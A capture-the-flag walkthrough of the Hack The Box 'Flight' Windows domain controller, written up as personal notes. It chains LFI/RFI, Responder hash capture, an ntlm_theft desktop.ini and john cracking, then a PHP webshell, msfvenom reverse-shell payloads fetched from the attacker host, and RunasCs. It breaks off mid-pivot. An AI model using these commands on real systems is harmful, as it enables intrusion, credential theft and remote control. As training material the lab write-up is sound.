---
{"dg-publish":true,"permalink":"/ct-fs/htb/flight/","dgShowFileTree":true,"dg-note-properties":{}}
---

#windows #web #reverse_shell #webshell #RunasCs #Rubeus #LFI #RFI #vhosts #chisel #tunneling #pivoting #Responder #ntlm_theft #smb #nic3r #ASPX_shell #IIS #kerberos 



Oh boy. Here we go...
## Recon
![Pasted image 20261028093053.png](/img/user/CTFs/HTB/Images/Flight%20Images/Pasted%20image%2020261028093053.png)

### Nmap:
```zsh
└─$ nmap -p- -Pn -sC -sV 10.129.228.120 -oA ./nmap_full    
Starting Nmap 7.991 ( https://nmap.org ) at 2026-10-28 12:30 -0400
Nmap scan report for 10.129.228.120
Host is up (0.086s latency).
Not shown: 65518 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Apache httpd 2.4.52 ((Win64) OpenSSL/1.1.1m PHP/8.1.1)
|_http-server-header: Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.1
|_http-title: g0 Aviation
| http-methods: 
|_  Potentially risky methods: TRACE
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-10-28 23:36:49Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: flight.htb, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: flight.htb, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
9389/tcp  open  mc-nmf        .NET Message Framing
49667/tcp open  msrpc         Microsoft Windows RPC
49673/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49674/tcp open  msrpc         Microsoft Windows RPC
49692/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: G0; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2026-10-28T23:37:40
|_  start_date: N/A
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required
|_clock-skew: 7h00m00s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 450.08 seconds
```
Initial portscanning shows a common suite of windows ports and services as well as a webserver running on port 80. Adding `G0.flight.htb` and the domain to `/etc/hosts`.

### Netexec
#### Guest and Null Share access
```zsh
┌──(kali㉿kali)-[~/CTF/HTB/flight/scanning]
└─$ nxc smb G0.flight.htb -u '' -p '' --shares                                  
SMB         10.129.228.120  445    G0               [*] Windows 10 / Server 2019 Build 17763 x64 (name:G0) (domain:flight.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.228.120  445    G0               [+] flight.htb\: 
SMB         10.129.228.120  445    G0               [-] Error enumerating shares: STATUS_ACCESS_DENIED
                                                                                                                                                                                                                                            
┌──(kali㉿kali)-[~/CTF/HTB/flight/scanning]
└─$ nxc smb G0.flight.htb -u 'Guest' -p '' --shares
SMB         10.129.228.120  445    G0               [*] Windows 10 / Server 2019 Build 17763 x64 (name:G0) (domain:flight.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.228.120  445    G0               [-] flight.htb\Guest: STATUS_ACCOUNT_DISABLED

┌──(kali㉿kali)-[~/CTF/HTB/flight/scanning]
└─$ nxc smb G0.flight.htb -u '' -p '' --users      
SMB         10.129.228.120  445    G0               [*] Windows 10 / Server 2019 Build 17763 x64 (name:G0) (domain:flight.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.228.120  445    G0               [+] flight.htb\: 
                                                                                                                                                                                                                                            
┌──(kali㉿kali)-[~/CTF/HTB/flight/scanning]
└─$ rpcclient -U '' -N G0.flight.htb    
rpcclient $> enumdomusers
result was NT_STATUS_ACCESS_DENIED

```
Enumerating our share access for Guest and Null access we see that null gets an access denied error and Guest gets an account disabled error. 

### Web
#### Manual Enumeration
![Pasted image 20261028094244.png](/img/user/CTFs/HTB/Images/Flight%20Images/Pasted%20image%2020261028094244.png)
Visiting the site in the browser shows what appears to be an airline's website to book tickets, learn about the company, and even apply for jobs. However, when attempting to click any of the buttons on the menu it gives an emtpy `#` page reference leading nowhere. Let's see if we can find any subdomains and directories.


#### Vhost and Subdir enumeration
##### Vhost Enumeration
```zsh
┌──(kali㉿kali)-[~/CTF/HTB/flight/scanning]
└─$ ffuf -v -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -u http://flight.htb -H "Host: FUZZ.flight.htb" -fw 1546

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://flight.htb
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt
 :: Header           : Host: FUZZ.flight.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response words: 1546
________________________________________________

[Status: 200, Size: 3996, Words: 1045, Lines: 91, Duration: 112ms]
| URL | http://flight.htb
    * FUZZ: school

:: Progress: [19966/19966] :: Job [1/1] :: 412 req/sec :: Duration: [0:00:49] :: Errors: 0 ::
```
Fuzzing for possible virtual host entries we get a hit on `school`. adding `school.flight.htb` to our `/etc/hosts` entry. 

###### School Site
![Pasted image 20261028095840.png](/img/user/CTFs/HTB/Images/Flight%20Images/Pasted%20image%2020261028095840.png)
Visiting our new virtual host we find a loosely setup avation school website.

![Pasted image 20261028102009.png](/img/user/CTFs/HTB/Images/Flight%20Images/Pasted%20image%2020261028102009.png)
Looking at the source we see the basic HTML for the static site being served via the `view=` parameter. This may be a parameter that we can exploit via LFI or SQL Injection.

![Pasted image 20261028102243.png](/img/user/CTFs/HTB/Images/Flight%20Images/Pasted%20image%2020261028102243.png)
Trying some LFI tricks out I inject `index.php` into the view parameter and lo and behold we see the back end PHP that's running the site we are on. Looking deeper it appears to be a set of string-based filters regarding the view parameter including some basic commonly used characters when mapping LFI on a system. If the input string passes the filters it then re-initializes the parameter and calls the full system file path: `C:\\xampp\\htdocs\\school.flight.htb\\home.html`. However, when we try to directly inject this file path we get blocked as one of the filter checks is for two consecutive backslash characters `\\`.

![Pasted image 20261028102857.png](/img/user/CTFs/HTB/Images/Flight%20Images/Pasted%20image%2020261028102857.png)
When we call a known file with linux-style path syntax it works without issue confirming LFI vulnerability on this machine.

![Pasted image 20261028110442.png](/img/user/CTFs/HTB/Images/Flight%20Images/Pasted%20image%2020261028110442.png)
```zsh
┌──(kali㉿kali)-[~/CTF/HTB/flight/exploit]
└─$ python3 -m http.server 8900
Serving HTTP on 0.0.0.0 port 8900 (http://0.0.0.0:8900/) ...
10.129.228.120 - - [28/Oct/2026 14:01:54] "GET /shell.txt HTTP/1.1" 200 -
10.129.228.120 - - [28/Oct/2026 14:02:30] "GET /shell.txt HTTP/1.1" 200 -
10.129.228.120 - - [28/Oct/2026 14:03:06] "GET /shell.php HTTP/1.1" 200 -
10.129.228.120 - - [28/Oct/2026 14:03:16] "GET /shell.php HTTP/1.1" 200 -
10.129.228.120 - - [28/Oct/2026 14:03:25] "GET /shell.php?cmd=whoami HTTP/1.1" 200 -
10.129.228.120 - - [28/Oct/2026 14:03:30] "GET /shell.php?cmd=ipconfig HTTP/1.1" 200 -
```
Additionally we also confirm Remote File Inclusion (RFI) on this device as well. However, our attempts to abuse a php webshell prove unsuccessful so far.

![Pasted image 20261028113610.png](/img/user/CTFs/HTB/Images/Flight%20Images/Pasted%20image%2020261028113610.png)
Taking a look at more LFI items we see that we can also enumerate all valid virtual hosts on the machine. We discover that our flight booking site is actually just the root domain at `flight.htb` and the page we're on is confirmed as well.

###### RFI to Hash capture
![Pasted image 20261028115743.png](/img/user/CTFs/HTB/Images/Flight%20Images/Pasted%20image%2020261028115743.png)

```zsh
┌──(kali㉿kali)-[~/CTF/HTB/flight/exploit]
└─$ sudo responder -I tun0 -wdv
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|


[*] Tips jar:
    USDT -> 0xCc98c1D3b8cd9b717b5257827102940e4E17A19A
    BTC  -> bc1q9360jedhhmps5vpl3u05vyg4jryrl52dmazz49

[+] Poisoners:
    LLMNR                      [ON]
    NBT-NS                     [ON]
    MDNS                       [ON]
    DNS                        [ON]
    DHCP                       [ON]
    DHCPv6                     [OFF]

[+] Servers:
    HTTP server                [ON]
    HTTPS server               [ON]
    WPAD proxy                 [ON]
    Auth proxy                 [OFF]
    SMB server                 [ON]
    Kerberos server            [ON]
    SQL server                 [ON]
    FTP server                 [ON]
    IMAP server                [ON]
    POP3 server                [ON]
    SMTP server                [ON]
    DNS server                 [ON]
    LDAP server                [ON]
    MQTT server                [ON]
    RDP server                 [ON]
    DCE-RPC server             [ON]
    WinRM server               [ON]
    SNMP server                [ON]

[+] HTTP Options:
    Always serving EXE         [OFF]
    Serving EXE                [OFF]
    Serving HTML               [OFF]
    Upstream Proxy             [OFF]

[+] Poisoning Options:
    Analyze Mode               [OFF]
    Force WPAD auth            [OFF]
    Force Basic Auth           [OFF]
    Force LM downgrade         [OFF]
    Force ESS downgrade        [OFF]

[+] Generic Options:
    Responder NIC              [tun0]
    Responder IP               [10.10.14.24]
    Responder IPv6             [fe80::308b:f246:8c3a:f5a2]
    Challenge set              [random]
    Don't Respond To Names     ['ISATAP', 'ISATAP.LOCAL']
    Don't Respond To MDNS TLD  ['_DOSVC']
    TTL for poisoned response  [default]

[+] Current Session Variables:
    Responder Machine Name     [WIN-47DAFFHBW5A]
    Responder Domain Name      [FBXN.LOCAL]
    Responder DCE-RPC Port     [47547]

[*] Version: Responder 3.2.2.0
[*] Author: Laurent Gaffie, <lgaffie@secorizon.com>

[+] Listening for events...

[SMB] NTLMv2-SSP Client   : 10.129.228.120
[SMB] NTLMv2-SSP Username : flight\svc_apache
[SMB] NTLMv2-SSP Hash     : svc_apache::flight:293e8d015ce6f7eb:D7130CB11DDE3F700695EB457D1858A2:010100000000000080CCE036EC66DD015D18A56505952D9500000000020008004600420058004E0001001E00570049004E002D003400370044004100460046004800420057003500410004003400570049004E002D00340037004400410046004600480042005700350041002E004600420058004E002E004C004F00430041004C00030014004600420058004E002E004C004F00430041004C00050014004600420058004E002E004C004F00430041004C000700080080CCE036EC66DD0106000400020000000800300030000000000000000000000000300000E3213424C8B8E846BD6DC0968632AA54A2C1D3E92FD7F3EE3157304847E195670A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310034002E0032003400000000000000000
```
Since we noted this server has an RFI vulnerability as well, I setup a Responder session and attempted to pass a fake share targeting our session and as you can see we successfully capture the pre-auth NetNTLMv2 hash for the `svc_apache` user.

###### Cracking the Hash
```zsh
┌──(kali㉿kali)-[~/…/HTB/flight/loot/hashes]
└─$ john --format=netntlmv2 --wordlist=/usr/share/wordlists/rockyou.txt svc_apache.hash 
Using default input encoding: UTF-8
Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
S@Ss!K@*t13      (svc_apache)     
1g 0:00:00:02 DONE (2026-10-28 15:00) 0.3952g/s 4214Kp/s 4214Kc/s 4214KC/s SADSAM..S42150461
Use the "--show --format=netntlmv2" options to display all of the cracked passwords reliably
Session completed.
```
We successfully crack the password has for the `svc_apache` user on the server.

## Initial Access
```zsh

└─$ nxc smb G0.flight.htb -u 'svc_apache' -p 'S@Ss!K@*t13' --users
SMB         10.129.228.120  445    G0               [*] Windows 10 / Server 2019 Build 17763 x64 (name:G0) (domain:flight.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.228.120  445    G0               [+] flight.htb\svc_apache:S@Ss!K@*t13 
```
### User Enumeration
```zsh
┌──(kali㉿kali)-[~/CTF/HTB/flight/exploit]
└─$ nxc smb G0.flight.htb -u 'svc_apache' -p 'S@Ss!K@*t13' --users-export users.txt
SMB         10.129.228.120  445    G0               [*] Windows 10 / Server 2019 Build 17763 x64 (name:G0) (domain:flight.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.228.120  445    G0               [+] flight.htb\svc_apache:S@Ss!K@*t13 
SMB         10.129.228.120  445    G0               -Username-                    -Last PW Set-       -BadPW- -Description-                                               
SMB         10.129.228.120  445    G0               Administrator                 2022-09-22 20:17:02 0       Built-in account for administering the computer/domain 
SMB         10.129.228.120  445    G0               Guest                         <never>             0       Built-in account for guest access to the computer/domain 
SMB         10.129.228.120  445    G0               krbtgt                        2022-09-22 19:48:01 0       Key Distribution Center Service Account 
SMB         10.129.228.120  445    G0               S.Moon                        2022-09-22 20:08:22 0       Junion Web Developer 
SMB         10.129.228.120  445    G0               R.Cold                        2022-09-22 20:08:22 0       HR Assistant 
SMB         10.129.228.120  445    G0               G.Lors                        2022-09-22 20:08:22 0       Sales manager 
SMB         10.129.228.120  445    G0               L.Kein                        2022-09-22 20:08:22 0       Penetration tester 
SMB         10.129.228.120  445    G0               M.Gold                        2022-09-22 20:08:22 0       Sysadmin 
SMB         10.129.228.120  445    G0               C.Bum                         2022-09-22 20:08:22 0       Senior Web Developer 
SMB         10.129.228.120  445    G0               W.Walker                      2022-09-22 20:08:22 0       Payroll officer 
SMB         10.129.228.120  445    G0               I.Francis                     2022-09-22 20:08:22 0       Nobody knows why he's here 
SMB         10.129.228.120  445    G0               D.Truff                       2022-09-22 20:08:22 0       Project Manager 
SMB         10.129.228.120  445    G0               V.Stevens                     2022-09-22 20:08:22 0       Secretary 
SMB         10.129.228.120  445    G0               svc_apache                    2022-09-22 20:08:23 0       Service Apache web 
SMB         10.129.228.120  445    G0               O.Possum                      2022-09-22 20:08:23 0       Helpdesk
```
We successfully abuse our newly gained credentials to pull a list of valid users.

### Password Reuse Check
```zsh
┌──(kali㉿kali)-[~/CTF/HTB/flight/exploit]
└─$ nxc smb G0.flight.htb -u users.txt -p 'S@Ss!K@*t13' --continue-on-success
SMB         10.129.228.120  445    G0               [*] Windows 10 / Server 2019 Build 17763 x64 (name:G0) (domain:flight.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.228.120  445    G0               [-] flight.htb\Administrator:S@Ss!K@*t13 STATUS_LOGON_FAILURE 
SMB         10.129.228.120  445    G0               [-] flight.htb\Guest:S@Ss!K@*t13 STATUS_LOGON_FAILURE 
SMB         10.129.228.120  445    G0               [-] flight.htb\krbtgt:S@Ss!K@*t13 STATUS_LOGON_FAILURE 
SMB         10.129.228.120  445    G0               [+] flight.htb\S.Moon:S@Ss!K@*t13 
SMB         10.129.228.120  445    G0               [-] flight.htb\R.Cold:S@Ss!K@*t13 STATUS_LOGON_FAILURE 
SMB         10.129.228.120  445    G0               [-] flight.htb\G.Lors:S@Ss!K@*t13 STATUS_LOGON_FAILURE 
SMB         10.129.228.120  445    G0               [-] flight.htb\L.Kein:S@Ss!K@*t13 STATUS_LOGON_FAILURE 
SMB         10.129.228.120  445    G0               [-] flight.htb\M.Gold:S@Ss!K@*t13 STATUS_LOGON_FAILURE 
SMB         10.129.228.120  445    G0               [-] flight.htb\C.Bum:S@Ss!K@*t13 STATUS_LOGON_FAILURE 
SMB         10.129.228.120  445    G0               [-] flight.htb\W.Walker:S@Ss!K@*t13 STATUS_LOGON_FAILURE 
SMB         10.129.228.120  445    G0               [-] flight.htb\I.Francis:S@Ss!K@*t13 STATUS_LOGON_FAILURE 
SMB         10.129.228.120  445    G0               [-] flight.htb\D.Truff:S@Ss!K@*t13 STATUS_LOGON_FAILURE 
SMB         10.129.228.120  445    G0               [-] flight.htb\V.Stevens:S@Ss!K@*t13 STATUS_LOGON_FAILURE 
SMB         10.129.228.120  445    G0               [+] flight.htb\svc_apache:S@Ss!K@*t13 
SMB         10.129.228.120  445    G0               [-] flight.htb\O.Possum:S@Ss!K@*t13 STATUS_LOGON_FAILURE 
```
Checking for password reuse we see that user `S.Moon` also uses the password we just cracked.

### Authenticated Share Access
```zsh
┌──(kali㉿kali)-[~/CTF/HTB/flight/exploit]
└─$ nxc smb G0.flight.htb -u S.Moon -p 'S@Ss!K@*t13' --shares                       
SMB         10.129.228.120  445    G0               [*] Windows 10 / Server 2019 Build 17763 x64 (name:G0) (domain:flight.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.228.120  445    G0               [+] flight.htb\S.Moon:S@Ss!K@*t13 
SMB         10.129.228.120  445    G0               [*] Enumerated shares
SMB         10.129.228.120  445    G0               Share           Permissions     Remark
SMB         10.129.228.120  445    G0               -----           -----------     ------
SMB         10.129.228.120  445    G0               ADMIN$                          Remote Admin
SMB         10.129.228.120  445    G0               C$                              Default share
SMB         10.129.228.120  445    G0               IPC$            READ            Remote IPC
SMB         10.129.228.120  445    G0               NETLOGON        READ            Logon server share 
SMB         10.129.228.120  445    G0               Shared          READ,WRITE      
SMB         10.129.228.120  445    G0               SYSVOL          READ            Logon server share 
SMB         10.129.228.120  445    G0               Users           READ            
SMB         10.129.228.120  445    G0               Web             READ            
                                                                                                                                                                                                                                            
┌──(kali㉿kali)-[~/CTF/HTB/flight/exploit]
└─$ nxc smb G0.flight.htb -u svc_apache -p 'S@Ss!K@*t13' --shares
SMB         10.129.228.120  445    G0               [*] Windows 10 / Server 2019 Build 17763 x64 (name:G0) (domain:flight.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.228.120  445    G0               [+] flight.htb\svc_apache:S@Ss!K@*t13 
SMB         10.129.228.120  445    G0               [*] Enumerated shares
SMB         10.129.228.120  445    G0               Share           Permissions     Remark
SMB         10.129.228.120  445    G0               -----           -----------     ------
SMB         10.129.228.120  445    G0               ADMIN$                          Remote Admin
SMB         10.129.228.120  445    G0               C$                              Default share
SMB         10.129.228.120  445    G0               IPC$            READ            Remote IPC
SMB         10.129.228.120  445    G0               NETLOGON        READ            Logon server share 
SMB         10.129.228.120  445    G0               Shared          READ            
SMB         10.129.228.120  445    G0               SYSVOL          READ            Logon server share 
SMB         10.129.228.120  445    G0               Users           READ            
SMB         10.129.228.120  445    G0               Web             READ
```
Checking our share access we see that both users have read access to three non-standard shares: `Shared`, `Users`, and `Web` while `S.Moon` has write permissions on `Shared` as well.

```zsh
┌──(kali㉿kali)-[~/…/HTB/flight/loot/bloodhound]
└─$ smbclient -U 'flight.htb/svc_apache%S@Ss!K@*t13' \\\\G0.flight.htb\\Users                                  
Try "help" to get a list of possible commands.
smb: \> dir
  .                                  DR        0  Thu Sep 22 16:16:56 2022
  ..                                 DR        0  Thu Sep 22 16:16:56 2022
  .NET v4.5                           D        0  Thu Sep 22 15:28:03 2022
  .NET v4.5 Classic                   D        0  Thu Sep 22 15:28:02 2022
  Administrator                       D        0  Mon Oct 31 14:34:00 2022
  All Users                       DHSrn        0  Sat Sep 15 03:28:48 2018
  C.Bum                               D        0  Thu Sep 22 16:08:23 2022
  Default                           DHR        0  Tue Jul 20 15:20:24 2021
  Default User                    DHSrn        0  Sat Sep 15 03:28:48 2018
  desktop.ini                       AHS      174  Sat Sep 15 03:16:48 2018
  Public                             DR        0  Tue Jul 20 15:23:25 2021
  svc_apache                          D        0  Fri Oct 21 14:50:21 2022

		5056511 blocks of size 4096. 1234961 blocks available

```
Enumerating the `Users` share we see folders for our `svc_apache` user and for `C.Bum`. This is likely our target for `user.txt`. Let's focus our attack there. We also may be able to abuse `S.Moon's` write permission to the `Shared` folder. That folder is currently empty. Let's see if we can change that.

#### Credential Theft via SMB Share
```zsh
┌──(p3v)─(kali㉿kali)-[~/…/HTB/flight/loot/hashes]
└─$ ntlm_theft --generate all --server 10.10.14.24 --filename updater_svc
Created: updater_svc/updater_svc.scf (BROWSE TO FOLDER)
Created: updater_svc/updater_svc-(url).url (BROWSE TO FOLDER)
Created: updater_svc/updater_svc-(icon).url (BROWSE TO FOLDER)
Created: updater_svc/updater_svc.lnk (BROWSE TO FOLDER)
Created: updater_svc/updater_svc.rtf (OPEN)
Created: updater_svc/updater_svc-(stylesheet).xml (OPEN)
Created: updater_svc/updater_svc-(fulldocx).xml (OPEN)
Created: updater_svc/updater_svc.htm (OPEN FROM DESKTOP WITH CHROME, IE OR EDGE)
Created: updater_svc/updater_svc-(handler).htm (OPEN FROM DESKTOP WITH CHROME, IE OR EDGE)
Created: updater_svc/updater_svc-(includepicture).docx (OPEN)
Created: updater_svc/updater_svc-(remotetemplate).docx (OPEN)
Created: updater_svc/updater_svc-(frameset).docx (OPEN)
Created: updater_svc/updater_svc-(externalcell).xlsx (OPEN)
Created: updater_svc/updater_svc.wax (OPEN)
Created: updater_svc/updater_svc.m3u (OPEN IN WINDOWS MEDIA PLAYER ONLY)
Created: updater_svc/updater_svc.asx (OPEN)
Created: updater_svc/updater_svc.jnlp (OPEN)
Created: updater_svc/updater_svc.application (DOWNLOAD AND OPEN)
Created: updater_svc/updater_svc.pdf (OPEN AND ALLOW)
Created: updater_svc/zoom-attack-instructions.txt (PASTE TO CHAT)
Created: updater_svc/updater_svc.library-ms (BROWSE TO FOLDER)
Created: updater_svc/Autorun.inf (BROWSE TO FOLDER)
Created: updater_svc/desktop.ini (BROWSE TO FOLDER)
Created: updater_svc/updater_svc.theme (THEME TO INSTALL)
Created: updater_svc/updater_svc.bat (BROWSE TO FOLDER)
Generation Complete
```
After much trial and error I had to use a hint and found a tool called [NTLM Theft](https://github.com/Greenwolf/ntlm_theft). This generates a series of malicious files to be used in various upload schemes to windows targets in an effort to capture credentials as they are accessed. Let's see if we can get one of these inside the Shared share. I'll admit I tried this already with the slinky module in `nxc` and psexec from impacket to no success, but our hint pointed us in this direction.

```zsh
┌──(kali㉿kali)-[~/…/flight/loot/hashes/updater_svc]
└─$ smbclient //G0.flight.htb/Shared -U 'flight.htb\S.Moon%S@Ss!K@*t13'                  
Try "help" to get a list of possible commands.
smb: \> put desktop.ini 
putting file desktop.ini as \desktop.ini (0.2 kB/s) (average 0.2 kB/s)
smb: \> 
```
trying all the generated files we finally see that the only extensions allowed are `.ini` files.

```zsh
[+] Listening for events...

[SMB] NTLMv2-SSP Client   : 10.129.228.120
[SMB] NTLMv2-SSP Username : flight.htb\c.bum
[SMB] NTLMv2-SSP Hash     : c.bum::flight.htb:0644dfe2e72155f5:34ABCB31B841B1324A3C9283B394AF71:010100000000000080946068FA66DD014A0676CF85D14B870000000002000800350035005300440001001E00570049004E002D0043004A0046004700550059005900380053005900450004003400570049004E002D0043004A004600470055005900590038005300590045002E0035003500530044002E004C004F00430041004C000300140035003500530044002E004C004F00430041004C000500140035003500530044002E004C004F00430041004C000700080080946068FA66DD0106000400020000000800300030000000000000000000000000300000E3213424C8B8E846BD6DC0968632AA54A2C1D3E92FD7F3EE3157304847E195670A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310034002E00320034000000000000000000

┌──(kali㉿kali)-[~/…/HTB/flight/loot/hashes]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt cbum.hash                         
Using default input encoding: UTF-8
Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
Tikkycoll_431012284 (c.bum)     
1g 0:00:00:02 DONE (2026-10-28 16:37) 0.3906g/s 4116Kp/s 4116Kc/s 4116KC/s TinyMutt69..Tiffani29
Use the "--show --format=netntlmv2" options to display all of the cracked passwords reliably
Session completed. 
```
And after a few moments we successfully capture and crack the hash for `C.Bum`.

```zsh
┌──(kali㉿kali)-[~/…/flight/loot/hashes/updater_svc]
└─$ nxc smb G0.flight.htb -u c.bum -p 'Tikkycoll_431012284' --shares
SMB         10.129.228.120  445    G0               [*] Windows 10 / Server 2019 Build 17763 x64 (name:G0) (domain:flight.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.228.120  445    G0               [+] flight.htb\c.bum:Tikkycoll_431012284 
SMB         10.129.228.120  445    G0               [*] Enumerated shares
SMB         10.129.228.120  445    G0               Share           Permissions     Remark
SMB         10.129.228.120  445    G0               -----           -----------     ------
SMB         10.129.228.120  445    G0               ADMIN$                          Remote Admin
SMB         10.129.228.120  445    G0               C$                              Default share
SMB         10.129.228.120  445    G0               IPC$            READ            Remote IPC
SMB         10.129.228.120  445    G0               NETLOGON        READ            Logon server share 
SMB         10.129.228.120  445    G0               Shared          READ,WRITE      
SMB         10.129.228.120  445    G0               SYSVOL          READ            Logon server share 
SMB         10.129.228.120  445    G0               Users           READ            
SMB         10.129.228.120  445    G0               Web             READ,WRITE 
```
We successfully connect to the server as `c.bum` and find out he has write access over the `Web` dir. We may have to turn around and do this attack again.

```zsh
smb: \C.Bum\> dir Desktop/*
  .                                  DR        0  Thu Sep 22 16:17:02 2022
  ..                                 DR        0  Thu Sep 22 16:17:02 2022
  user.txt                           AR       34  Wed Oct 28 19:29:06 2026

		5056511 blocks of size 4096. 1232896 blocks available
```
And as I originally thought, `user.txt` is sitting in his Desktop on the Users share.

### Pivoting
```zsh
┌──(kali㉿kali)-[~/CTF/HTB/flight/exploit]
└─$ cat shell.php                                 
<?php system($_GET['cmd']); ?> 

smb: \flight.htb\> ls
  .                                   D        0  Thu Oct 29 00:37:05 2026
  ..                                  D        0  Thu Oct 29 00:37:05 2026
  css                                 D        0  Thu Oct 29 00:37:01 2026
  images                              D        0  Thu Oct 29 00:37:01 2026
  index.html                          A     7069  Thu Feb 24 00:58:10 2022
  js                                  D        0  Thu Oct 29 00:37:01 2026
  shell.php                           A       30  Thu Oct 29 00:37:05 2026

		5056511 blocks of size 4096. 1229320 blocks available
```
Since we have write permission to the Web share, we upload a simple PHP webshell as `shell.php` to the `flight.htb` webroot.

```zsh
┌──(kali㉿kali)-[~/CTF/HTB/flight/exploit]
└─$ curl -v http://flight.htb/shell.php?cmd=whoami
* Host flight.htb:80 was resolved.
* IPv6: (none)
* IPv4: 10.129.228.120
*   Trying 10.129.228.120:80...
* Established connection to flight.htb (10.129.228.120 port 80) from 10.10.14.24 port 53140 
* using HTTP/1.x
> GET /shell.php?cmd=whoami HTTP/1.1
> Host: flight.htb
> User-Agent: curl/8.22.0
> Accept: */*
> 
* Request completely sent off
< HTTP/1.1 200 OK
< Date: Thu, 29 Oct 2026 04:40:33 GMT
< Server: Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.1
< X-Powered-By: PHP/8.1.1
< Content-Length: 19
< Content-Type: text/html; charset=UTF-8
< 
flight\svc_apache
* Connection #0 to host flight.htb:80 left intact
```
As you can see we have full RCE on the server now. Let's try and get a shell.

```zsh
┌──(kali㉿kali)-[~/…/HTB/flight/exploit/postcomp]
└─$ msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=10.10.14.24 LPORT=9999 -a x64 -f exe --platform windows -o shell2.exe 

┌──(kali㉿kali)-[~/CTF/HTB/flight/exploit]
└─$ smbclient //G0.flight.htb/Web -U 'flight.htb\c.bum%Tikkycoll_431012284'
Try "help" to get a list of possible commands.
smb: \> put access.php 
putting file access.php as \access.php (0.1 kB/s) (average 0.1 kB/s)
smb: \> put shell2.exe 
putting file shell2.exe as \shell2.exe (28.6 kB/s) (average 14.6 kB/s)
smb: \> ls
  .                                   D        0  Thu Oct 29 23:05:47 2026
  ..                                  D        0  Thu Oct 29 23:05:47 2026
  access.php                          A       30  Thu Oct 29 23:05:44 2026
  flight.htb                          D        0  Mon Oct 31 23:22:02 2022
  school.flight.htb                   D        0  Mon Oct 31 23:22:03 2022
  shell2.exe                          A     7680  Thu Oct 29 23:05:47 2026

		5056511 blocks of size 4096. 1235215 blocks available
		

┌──(kali㉿kali)-[~/…/flight/exploit/postcomp/RunasCs]
└─$ curl http://flight.htb/access.php?cmd=shell2.exe

┌──(kali㉿kali)-[~/…/flight/exploit/postcomp/RunasCs]
└─$ nc -lnvp 9999
listening on [any] 9999 ...
connect to [10.10.14.24] from (UNKNOWN) [10.129.228.120] 65236
Microsoft Windows [Version 10.0.17763.2989]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\xampp\htdocs\flight.htb>whoami
flight\svc_apache
```
We start by uploading a reverse shell payload called `shell2.exe` to the same endpoint. We setup a netcat listener with the ports specified in the `shell2.exe` payload, We curl the endpoint using the `cmd=` paramter in our webshell (renamed to `access.php` in this example) to call our executable, and just like that, we gain shell access as `svc_apache` again. Now that we have shell access let's see if we can switch users over to `c.bum`.

#### Completing the Pivot
```zsh
┌──(kali㉿kali)-[~/…/HTB/flight/exploit/postcomp]
└─$ msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=10.10.14.24 LPORT=8888 -a x64 -f exe --platform windows -o run2.exe

PS C:\Users\Public> iwr -Uri http://10.10.14.24:8900/run2.exe -outfile run2.exe

PS C:\Users\Public> iwr -Uri http://10.10.14.24:8900/RunasCs.exe -outfile RunasCs.exe
```
Next we upload another msfvenom payload executable to a publicly writable directory (`C:\Users\Public` in our case) calling a different port than our original one and upload [RunasCs](https://github.com/antonioCoco/RunasCs/releases/tag/v1.5). This tool allows us to use Windows `runas` while providing explicit credentials via stdin.

```zsh
PS C:\Users\Public> ./RunasCs C.Bum 'Tikkycoll_431012284' 'run2.exe'

